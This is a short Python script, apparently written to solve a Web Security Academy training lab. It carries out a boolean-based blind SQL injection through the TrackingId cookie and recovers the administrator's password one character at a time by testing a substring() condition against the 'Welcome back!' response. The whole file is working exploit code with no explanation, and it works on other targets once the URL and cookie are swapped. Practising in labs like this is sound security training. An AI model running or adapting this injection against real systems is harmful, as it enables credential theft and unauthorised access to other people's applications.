import requests
import string

url="https://0a4400bb03dd2b82832aafb200b400d6.web-security-academy.net"
password=""
position=1

new_letter_found = True

while new_letter_found:
	new_letter_found = False
	for c in string.digits + string.ascii_letters:
		possible_password = password+c
		tracking_id = "a73vHYoe3vG0ml6Q' and substring((select password from users where username='administrator'),1,{})='{}".format(position,possible_password)
		if "Welcome back!" in requests.get(url,cookies={"TrackingId":tracking_id,"session":"lxpoRdCBskpaBuVlsXlifE8sT7YkUIDk"}).text:
			password = password + c
			print(password)
			position = position + 1
			new_letter_found = True
			break

print("Password = ", password)
	
	
